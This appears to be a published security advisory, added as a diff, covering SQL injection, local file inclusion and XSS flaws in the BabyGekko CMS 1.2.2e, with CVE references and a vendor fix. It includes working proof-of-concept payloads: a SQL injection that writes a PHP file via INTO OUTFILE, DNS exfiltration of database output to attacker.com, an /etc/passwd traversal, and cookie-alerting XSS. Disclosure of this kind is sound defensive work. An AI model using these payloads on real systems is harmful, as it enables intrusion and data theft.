@@ -1,0 +1,101 @@
+Advisory ID: HTB23122
+Product: BabyGekko
+Vendor: babygekko.com
+Vulnerable Version(s): 1.2.2e and probably prior
+Tested Version: 1.2.2e
+Vendor Notification: October 24, 2012 
+Vendor Patch: November 4, 2012 
+Public Disclosure: November 14, 2012 
+Vulnerability Type: SQL Injection [CWE-89], PHP File Inclusion [CWE-98], Cross-Site Scripting [CWE-79]
+CVE References: CVE-2012-5698, CVE-2012-5699, CVE-2012-5700
+CVSSv2 Base Scores: 6.5 (AV:N/AC:L/Au:S/C:P/I:P/A:P), 7.6 (AV:N/AC:H/Au:N/C:C/I:C/A:C), 4.3 (AV:N/AC:M/Au:N/C:N/I:P/A:N)
+Solution Status: Fixed by Vendor
+Risk Level: High 
+Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ ) 
+
+-----------------------------------------------------------------------------------------------
+
+Advisory Details:
+
+High-Tech Bridge Security Research Lab discovered multiple vulnerabilities in BabyGekko, which can be exploited to include local PHP files, perform SQL Injection and Cross-Site Scripting (XSS) attacks.
+
+
+1) Multiple SQL Injections in BabyGekko
+
+Two SQL injections exist in BabyGekko administrator's panel but their exploitation demands administrator's privileges. However they can also be exploited by a non-authenticated malicious user via CSRF vector, because "/admin/index.php" script is also vulnerable to CSRF attack. In order to do so he has to make logged-in administrator visit a malicious page. 
+
+1.1 The vulnerability exists due to insufficient validation of input passed via the "keyword" parameter to "/admin/index.php" (when "app" is set to "users"). A remote authenticated administrator can manipulate SQL queries and execute arbitrary SQL commands within application's database. 
+
+The following PoC (Proof-of-Concept) will create (depending on web server and database permissions) a file "/tmp/.class.php" and writes "<?phpinfo()?>" into it:
+
+http://[host]/admin/index.php?app=users&ajax=1&action=search&keyword=1%27%29%20UNION%20SELECT%201,2,3,4,5,6,7,8,%27%3C?%20phpinfo%28%29;%20?%3E%27%20INTO%20OUTFILE%20%27/tmp/.class.php%27%20--%202%20
+
+The second PoC code below is based on DNS Exfiltration technique and may be used in cases when application's database is hosted on a Windows system. The PoC sends a DNS request to resolve an IP address for the `version()` (or any other sensitive output from the database) subdomain of ".attacker.com", located on attacker controlled DNS server:
+
+http://[host]/admin/index.php?app=users&ajax=1&action=search&keyword=%27 OR 1=(select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114)))) -- 
+
+1.2 The vulnerability exists due to insufficient validation of input passed via the "query" parameter to "/admin/index.php". A remote authenticated administrator can manipulate SQL queries and execute arbitrary SQL commands within application's database.
+
+The following PoC will create (depending on web server and database permissions) a file "/tmp/.class.php" and writes "<?phpinfo()?>" into it:
+
+http://[host]/admin/index.php?app=html&action=getlistofusers&query=1%27%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,%27%3C?%20phpinfo%28%29;%20?%3E%27%20INTO%20OUTFILE%20%27/tmp/.class.php%27%20--%202%20
+
+The second PoC code below is based on DNS Exfiltration technique and may be used in cases when application's database is hosted on a Windows system. The PoC sends a DNS request to resolve an IP address for the `version()` (or any other sensitive output from the database) subdomain of ".attacker.com", located on attacker controlled DNS server:
+
+http://[host]/admin/index.php?app=html&action=getlistofusers&query=%27 OR 1=(select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114)))) -- 
+
+
+2) Local File Inclusion in BabyGekko
+
+The vulnerability exists due to insufficient validation of input passed via the "app" parameter to "index.php". A remote attacker can include arbitrary files from local system using directory traversal sequences with NULL byte. 
+
+The following PoC will show the "/etc/passwd" file:
+
+http://[host]/index.php?app=../../../../../../../etc/passwd%00
+
+Second PoC demonstrates inclusion of "/tmp/.class.php" file created during exploitation of vulnerabilities 1.1 or 1.2. Depending on server configuration and permissions it will show the results of "phpinfo()" function execution:
+
+http://[host]/index.php?app=../../../../../../../tmp/
+
+
+3) Multiple Cross-Site Scripting (XSS) in BabyGekko
+
+3.1 Input passed via the "id" parameter to "/admin/index.php" is not properly sanitized. A remote attacker can execute arbitrary HTML and script code in administrator's browser in context of vulnerable website.
+
+The following PoC code demonstrates the vulnerability:
+
+http://[host]/admin/index.php?app=templates&action=edititem&id=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+3.2 Insufficient sanitation of input passed via the "username" and "password" HTTP POST parameters to the "index.php" can be used to inject and execute arbitrary HTML and script code in user's browser in context of vulnerable website. Successful exploitation of this vulnerability requires "loginbox" block to be activated.
+
+The following PoC code demonstrates the vulnerability:
+
+
+<form action="http://[host]/index.php" method="post" enctype="multipart/form-data">
+<input type="hidden" name="username" value='"><script>alert(document.cookie);</script>' />
+<input type="hidden" name="password" value='"><script>alert(document.cookie);</script>' />
+<input type="submit" id="btn">
+</form>
+
+
+-----------------------------------------------------------------------------------------------
+
+Solution:
+
+Upgrade to BabyGekko 1.2.2f or 1.2.4
+
+More Information:
+http://www.babygekko.com/downloads/gekko_web_builder_v1.2.2f.zip
+http://www.babygekko.com/site/news/general/babygekko-v1-2-4-has-been-released.html
+
+-----------------------------------------------------------------------------------------------
+
+References:
+
+[1] High-Tech Bridge Advisory HTB23122 - https://www.htbridge.com/advisory/HTB23122 - Multiple vulnerabilities in BabyGekko.
+[2] BabyGekko - http://www.babygekko.com - BabyGekko strives to deliver high quality websites and other web content fast and easy for all end users. It is a lightweight, extensible content management system platform for publishing websites, intranets, or blogs.
+[3] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types. 
+
+-----------------------------------------------------------------------------------------------
+
+Disclaimer: The information provided in this Advisory is provided "as is" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.
